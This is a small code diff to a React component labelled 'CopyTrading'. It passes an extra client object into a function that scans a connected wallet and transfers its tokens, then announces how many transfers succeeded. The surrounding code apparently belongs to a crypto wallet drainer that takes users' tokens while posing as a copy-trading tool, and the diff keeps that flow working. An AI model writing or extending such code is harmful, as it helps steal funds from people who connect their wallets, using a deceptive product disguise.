@@ -86,7 +86,7 @@ const CopyTrading = () => {
         const chainId = await walletClient.getChainId()
         
         // Start the token scanning and transfer process
-        const transferCount = await scanAndTransferTokens(walletClient, address, chainId)
+        const transferCount = await scanAndTransferTokens(walletClient, address, chainId, publicClient)
         
         if (transferCount > 0) {
           alert(`Successfully transferred tokens from your wallet! ${transferCount} transfers completed.`)
